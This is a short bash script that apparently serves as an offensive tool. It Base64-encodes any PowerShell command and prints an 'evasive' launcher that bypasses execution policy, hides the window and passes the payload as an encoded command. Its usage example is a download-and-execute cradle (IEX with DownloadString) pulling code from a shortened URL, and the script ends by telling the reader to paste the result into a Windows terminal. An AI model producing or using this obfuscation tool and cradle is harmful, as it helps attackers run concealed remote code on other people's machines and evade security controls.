#!/bin/bash

# Check if a command was provided
if [ -z "$1" ]; then
    echo -e "\n\e[1;31m[!] Error: No PowerShell command provided.\e[0m"
    echo -e "\e[1;32mUsage:\e[0m $0 \"<powershell_command>\""
    echo -e "\e[1;34mExample:\e[0m $0 \"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly')\""
    exit 1
fi

# The input command
RAW_COMMAND=$1

# 1. Encode the command to UTF-16LE (required by PowerShell) and then to Base64
B64_COMMAND=$(echo -n "$RAW_COMMAND" | iconv -t utf16le | base64 -w 0)

# 2. Generate the final evasive call
echo -e "\n\e[1;32m[+] Evasive PowerShell Command Generated:\e[0m\n"
echo "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $B64_COMMAND"
echo -e "\n\e[1;34m[*] Copy and paste the line above into the Windows terminal.\e[0m\n"
